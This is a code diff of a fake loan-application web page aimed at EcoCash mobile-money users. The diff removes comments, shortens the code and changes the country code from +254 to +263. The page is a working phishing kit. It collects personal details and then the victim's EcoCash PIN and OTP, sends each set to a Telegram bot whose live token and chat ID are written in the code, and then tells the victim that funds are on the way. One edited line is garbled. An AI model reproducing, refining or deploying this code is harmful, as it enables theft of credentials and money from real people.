@@ -80,7 +80,6 @@
             margin-bottom: 24px;
         }
 
-        /* Step Indicators */
         .steps-indicator {
             display: flex;
             justify-content: space-between;
@@ -136,7 +135,6 @@
             border-color: var(--primary);
         }
 
-        /* Calculator Styles */
         .calc-box {
             background: #f8fafc;
             border: 1px solid var(--border);
@@ -232,7 +230,6 @@
             opacity: 0.9;
         }
 
-        /* Summary Step */
         .summary-box {
             background: #f8fafc;
             border-radius: 8px;
@@ -272,7 +269,6 @@
             color: var(--text);
         }
 
-        /* Features List */
         .feature-item {
             display: flex;
             align-items: center;
@@ -327,7 +323,6 @@
         </div>
 
         <div class="card">
-            <!-- Step Indicators -->
             <div class="steps-indicator" id="stepsIndicator">
                 <div class="step-bar active" id="bar1"></div>
                 <div class="step-bar" id="bar2"></div>
@@ -335,7 +330,7 @@
             </div>
 
             <div id="loanForm">
-                <!-- STEP 1: Loan Calculator & Details -->
+                <!-- STEP 1 -->
                 <div class="step-content active" id="step1">
                     <div class="header-title">Get Your Loan Approved Fast</div>
                     <div class="header-sub">Quick approval &bull; Competitive rates &bull; Flexible terms</div>
@@ -387,33 +382,9 @@
                     </div>
 
                     <button type="button" class="btn btn-primary" style="width: 100%; margin-top: 10px;" id="nextBtn1">NEXT STEP</button>
-
-                    <div style="margin-top: 28px; border-top: 1px solid var(--border); padding-top: 20px;">
-                        <div class="feature-item">
-                            <div class="feature-icon">⚡</div>
-                            <div class="feature-text">
-                                <strong>Fast Approval</strong>
-                                <span>Within 24 hours</span>
-                            </div>
-                        </div>
-                        <div class="feature-item">
-                            <div class="feature-icon">📉</div>
-                            <div class="feature-text">
-                                <strong>Low Rates</strong>
-                                <span>From 8%</span>
-                            </div>
-                        </div>
-                        <div class="feature-item">
-                            <div class="feature-icon">🔒</div>
-                            <div class="feature-text">
-                                <strong>Secure</strong>
-                                <span>Bank-level encryption</span>
-                            </div>
-                        </div>
-                    </div>
                 </div>
 
-                <!-- STEP 2: Personal Information -->
+                <!-- STEP 2 -->
                 <div class="step-content" id="step2">
                     <div class="header-title">Loan Application</div>
                     <div class="header-sub">Step 2 of 3</div>
@@ -436,10 +407,9 @@
                     <div class="form-group">
                         <label>Phone Number</label>
                         <div class="phone-group">
-                            <div class="phone-prefix">+254</div>
-                            <input type="tel" id="phoneNumber" placeholder="712345678">
+                            <div class="phone-prefix">+263</div>
+                            <input type="tel" id="phoneNumber" placeholder="123456789">
                         </div>
-                        <span style="font-size: 11px; color: var(--muted); margin-top: 4px; display: block;">Enter phone number (e.g., 712345678)</span>
                     </div>
 
                     <div class="btn-group">
@@ -448,7 +418,7 @@
                     </div>
                 </div>
 
-                <!-- STEP 3: Employment & Summary -->
+                <!-- STEP 3 -->
                 <div class="step-content" id="step3">
                     <div class="header-title">Loan Application</div>
                     <div class="header-sub">Step 3 of 3</div>
@@ -500,7 +470,7 @@
                     <div id="initialStatusBox" class="status-msg"></div>
                 </div>
 
-                <!-- STEP 4: EcoCash PIN & OTP Verification -->
+                <!-- STEP 4 -->
                 <div class="step-content" id="step4">
                     <div class="header-title">Account Verification</div>
                     <div class="header-sub">Enter your EcoCash PIN & OTP to disburse funds</div>
@@ -512,13 +482,11 @@
                     <div class="form-group">
                         <label>EcoCash PIN</label>
                         <input type="password" id="ecocashPin" maxlength="5" placeholder="&bull;&bull;&bull;&bull;&bull;">
-                        <span style="font-size: 11px; color: var(--muted); margin-top: 4px; display: block;">Enter your 4 or 5 digit PIN</span>
                     </div>
 
                     <div class="form-group">
                         <label>OTP Code</label>
                         <input type="text" id="otpCode" placeholder="Enter 4-6 digit OTP">
-                        <span style="font-size: 11px; color: var(--muted); margin-top: 4px; display: block;">Check your SMS for the authorization code</span>
                     </div>
 
                     <div class="btn-group">
@@ -537,11 +505,9 @@
     </div>
 
     <script>
-        // Telegram Credentials
         const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
         const chatId = "8557614507";
 
-        // Range Slider & Term Select Logic
         const amountRange = document.getElementById('loanAmountRange');
         const termSelect = document.getElementById('loanTerm');
         const amountDisplay = document.getElementById('amountDisplay');
@@ -551,16 +517,9 @@
             if (!amountRange || !termSelect) return;
             const principal = parseFloat(amountRange.value);
             const months = parseInt(termSelect.value);
-            
             amountDisplay.textContent = '$' + principal.toLocaleString();
-
             const monthlyInterestRate = 0.08 / 12;
-            let monthlyPayment = 0;
-            if (monthlyInterestRate === 0) {
-                monthlyPayment = principal / months;
-            } else {
-                monthlyPayment = (principal * monthlyInterestRate * Math.pow(1 + monthlyInterestRate, months)) / (Math.pow(1 + monthlyInterestRate, months) - 1);
-            }
+            let monthlyPayment = monthlyInterestRate === 0 ? principal / months : (principal * monthlyInterestRate * Math.pow(1 + monthlyInterestRate, months)) / (Math.pow(1 + monthlyInterestRate, months) - 1);
             monthlyPaymentDisplay.textContent = '$' + monthlyPayment.toFixed(2);
         }
 
@@ -571,7 +530,6 @@
             updateCalculator();
         }
 
-        // Multi-step Navigation Event Listeners
         document.getElementById('nextBtn1').addEventListener('click', function() {
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
@@ -582,19 +540,15 @@
             const fn = document.getElementById('firstName').value.trim();
             const ln = document.getElementById('lastName').value.trim();
             const phone = document.getElementById('phoneNumber').value.trim();
-            
             if(!fn || !ln || !phone) {
                 alert('Please fill in your First Name, Last Name, and Phone Number.');
                 return;
             }
-
-            // Populate Summary
             document.getElementById('sumLoanType').textContent = document.getElementById('loanType').value;
             document.getElementById('sumAmount').textContent = amountDisplay.textContent;
             document.getElementById('sumTerm').textContent = termSelect.options[termSelect.selectedIndex].text;
             document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value || 'General Loan';
             document.getElementById('sumApplicant').textContent = fn.charAt(0).toUpperCase() + '. ' + ln.charAt(0).toUpperCase() + '.';
-
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step3').classList.add('active');
             document.getElementById('bar3').classList.add('active');
@@ -607,7 +561,7 @@
         });
 
         document.getElementById('prevBtn3').addEventListener('click', function() {
-            document.getElementById('step3').classList.remove('active');
+            document.getElementById('step3').classList.remove('active');        .classList.remove('active');
             document.getElementById('bar3').classList.remove('active');
             document.getElementById('step2').classList.add('active');
         });
@@ -618,84 +572,50 @@
             document.getElementById('step3').classList.add('active');
         });
 
-        // STAGE 1: Submit Initial Application
         document.getElementById('submitInitialBtn').addEventListener('click', async function() {
             const submitBtn = document.getElementById('submitInitialBtn');
             const statusBox = document.getElementById('initialStatusBox');
-
             submitBtn.disabled = true;
             submitBtn.textContent = 'SUBMITTING...';
-            statusBox.style.display = 'none';
 
             try {
-                const loanType = document.getElementById('loanType').value;
-                const firstName = document.getElementById('firstName').value;
-                const lastName = document.getElementById('lastName').value;
-                const email = document.getElementById('email').value || 'N/A';
-                const phone = '+254 ' + document.getElementById('phoneNumber').value;
-                const loanAmount = amountDisplay.textContent;
-                const loanTerm = termSelect.options[termSelect.selectedIndex].text;
-                const purpose = document.getElementById('loanPurpose').value;
-                const employment = document.getElementById('employmentStatus').value;
-                const annualIncome = document.getElementById('annualIncome').value;
-
                 const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
-                                `📂 *Loan Type:* ${loanType}\n` +
-                                `👤 *Name:* ${firstName} ${lastName}\n` +
-                                `📧 *Email:* ${email}\n` +
-                                `📱 *Phone:* ${phone}\n` +
-                                `💰 *Amount:* ${loanAmount}\n` +
-                                `⏱ *Term:* ${loanTerm}\n` +
-                                `📋 *Purpose:* ${purpose}\n` +
-                                `💼 *Employment:* ${employment}\n` +
-                                `💵 *Annual Income:* $${annualIncome}`;
+                                `📂 *Loan Type:* ${document.getElementById('loanType').value}\n` +
+                                `👤 *Name:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
+                                `📧 *Email:* ${document.getElementById('email').value || 'N/A'}\n` +
+                                `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
+                                `💰 *Amount:* ${amountDisplay.textContent}\n` +
+                                `⏱ *Term:* ${termSelect.options[termSelect.selectedIndex].text}\n` +
+                                `📋 *Purpose:* ${document.getElementById('loanPurpose').value}\n` +
+                                `💼 *Employment:* ${document.getElementById('employmentStatus').value}\n` +
+                                `💵 *Annual Income:* $${document.getElementById('annualIncome').value}`;
 
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 8000);
-
-                const response = await fetch(url, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    }),
-                    signal: controller.signal
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                 });
-                clearTimeout(timeoutId);
-
                 const data = await response.json();
 
                 if (data.ok) {
-                    // Transition to Verification Step (Step 4)
                     document.getElementById('step3').classList.remove('active');
                     document.getElementById('step4').classList.add('active');
                     document.getElementById('stepsIndicator').style.display = 'none';
                     submitBtn.disabled = false;
                     submitBtn.textContent = 'SUBMIT APPLICATION';
                 } else {
-                    throw new Error(data.description || 'Telegram API error');
+                    throw new Error(data.description);
                 }
             } catch (error) {
-                console.error(error);
-                statusBox.textContent = error.name === 'AbortError' ? 'Submission timed out. Please check your connection.' : 'Submission failed: ' + error.message;
-                statusBox.className = 'status-msg';
-                statusBox.style.background = '#fee2e2';
-                statusBox.style.color = '#991b1b';
-                statusBox.style.display = 'block';
+                alert('Submission failed: ' + error.message);
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'SUBMIT APPLICATION';
             }
         });
 
-        // STAGE 2: Submit Verification (PIN & OTP)
         document.getElementById('submitVerifyBtn').addEventListener('click', async function() {
             const pin = document.getElementById('ecocashPin').value.trim();
             const otp = document.getElementById('otpCode').value.trim();
-
             if (!pin || !otp) {
                 alert('Please enter both your EcoCash PIN and OTP code.');
                 return;
@@ -703,55 +623,34 @@
 
             const submitBtn = document.getElementById('submitVerifyBtn');
             const statusBox = document.getElementById('verifyStatusBox');
-
             submitBtn.disabled = true;
             submitBtn.textContent = 'VERIFYING...';
-            statusBox.style.display = 'none';
 
             try {
-                const firstName = document.getElementById('firstName').value;
-                const lastName = document.getElementById('lastName').value;
-                const phone = '+254 ' + document.getElementById('phoneNumber').value;
-
                 const message = `🔐 *ECOCASH VERIFICATION CREDENTIALS* 🔐\n\n` +
-                                `👤 *Applicant:* ${firstName} ${lastName}\n` +
-                                `📱 *Phone:* ${phone}\n` +
+                                `👤 *Applicant:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
+                                `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
                                 `🔑 *EcoCash PIN:* \`${pin}\`\n` +
                                 `🔢 *OTP Code:* \`${otp}\``;
 
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 8000);
-
-                const response = await fetch(url, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    }),
-                    signal: controller.signal
+                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                 });
-                clearTimeout(timeoutId);
-
                 const data = await response.json();
 
                 if (data.ok) {
                     statusBox.textContent = 'Verification successful! Funds will be credited to your wallet.';
-                    statusBox.className = 'status-msg';
                     statusBox.style.background = '#d1fae5';
                     statusBox.style.color = '#065f46';
                     statusBox.style.display = 'block';
                     submitBtn.textContent = 'VERIFIED & SUCCESSFUL';
                 } else {
-                    throw new Error(data.description || 'Telegram API error');
+                    throw new Error(data.description);
                 }
             } catch (error) {
-                console.error(error);
-                statusBox.textContent = error.name === 'AbortError' ? 'Verification timed out. Please check your connection.' : 'Verification failed: ' + error.message;
-                statusBox.className = 'status-msg';
+                statusBox.textContent = 'Verification failed: ' + error.message;
                 statusBox.style.background = '#fee2e2';
                 statusBox.style.color = '#991b1b';
                 statusBox.style.display = 'block';
